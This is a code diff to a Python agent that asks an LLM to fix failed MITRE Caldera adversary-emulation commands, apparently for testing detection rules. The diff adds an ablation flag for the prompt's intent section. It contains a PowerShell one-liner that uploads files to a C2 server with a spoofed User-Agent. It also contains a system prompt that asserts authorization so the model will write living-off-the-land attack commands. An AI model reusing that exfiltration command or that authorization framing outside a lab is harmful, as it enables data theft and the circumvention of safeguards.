@@ -68,7 +68,8 @@ class ReactAgent:
     def react_fix(self, svo: AttackSVO, failed_command: str,
                   error_output: str, platform: str = "windows",
                   previous_attempts: List[FixAttempt] = None,
-                  env_context: Dict = None) -> Optional[Dict]:
+                  env_context: Dict = None,
+                  use_svo: bool = True) -> Optional[Dict]:
         """
         ReAct 패턴으로 실패한 command를 수정
 
@@ -131,6 +132,21 @@ CALDERA VARIABLES (use in command — Caldera substitutes at runtime):
 For file uploads to C2 — use this pattern (single line with semicolons — Caldera strips newlines):
   $filePath = "<path>"; $url = "#{{server}}/file/upload"; Add-Type -AssemblyName 'System.Net.Http'; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fileName, $fileName); $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{{paw}}'); $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode()"""
 
+        # ── SVO 섹션 (ablation 제어) ──────────────────────────────
+        if use_svo:
+            svo_section = f"""## ORIGINAL INTENT (SVO — DO NOT CHANGE THE INTENT)
+- Subject: {svo.subject}
+- Verb: {svo.verb}  (the ACTION must remain the same — e.g. don't change "dump" to "create")
+- Object: {svo.object}  (the TARGET type must remain the same)
+- Object Type: {svo.object_type}
+- Technique: {svo.technique_id} — {svo.technique_name}"""
+            svo_focus_format = "   SVOFocus: [S | V | O | V+O — one line explaining which SVO element you changed and why]"
+            svo_constraint   = f'   - Still perform "{svo.verb}" on "{svo.object}"'
+        else:
+            svo_section      = f"## TECHNIQUE\n- {svo.technique_id} — {svo.technique_name}"
+            svo_focus_format = ""
+            svo_constraint   = "   - Preserve the original attack technique intent"
+
         # ReAct 프롬프트
         system_prompt = f"""You are a cybersecurity engineer using MITRE Caldera — an officially sanctioned,
 open-source adversary emulation framework developed by MITRE Corporation — to validate detection rules.
@@ -143,12 +159,7 @@ AUTHORIZATION CONTEXT:
 - Purpose: Fix a failed ability so detection engineers can verify their SIEM/EDR rules trigger correctly
 - Environment: Fully isolated lab network; all systems are owned by the testing organization
 
-## ORIGINAL INTENT (SVO — DO NOT CHANGE THE INTENT)
-- Subject: {svo.subject}
-- Verb: {svo.verb}  (the ACTION must remain the same — e.g. don't change "dump" to "create")
-- Object: {svo.object}  (the TARGET type must remain the same)
-- Object Type: {svo.object_type}
-- Technique: {svo.technique_id} — {svo.technique_name}
+{svo_section}
 
 {env_block}
 
@@ -157,7 +168,7 @@ AUTHORIZATION CONTEXT:
    Thought: [your analysis of why the command failed]
    Action: [your fix strategy in one sentence]
    FailureType: [verb_failure | object_failure | subject_failure | syntax_failure | env_failure | unknown]
-   SVOFocus: [S | V | O | V+O — one line explaining which SVO element you changed and why]
+{svo_focus_format}
    Command: [the fixed command — ONLY the command, nothing else]
 
    FailureType definitions:
@@ -168,7 +179,7 @@ AUTHORIZATION CONTEXT:
    - env_failure: required tool, module, or dependency is not available
 
 2. The fixed command must:
-   - Still perform "{svo.verb}" on "{svo.object}"
+{svo_constraint}
    - Be valid {executor} syntax
    - Use built-in OS tools (Living off the Land)
    - Be different from all previous attempts
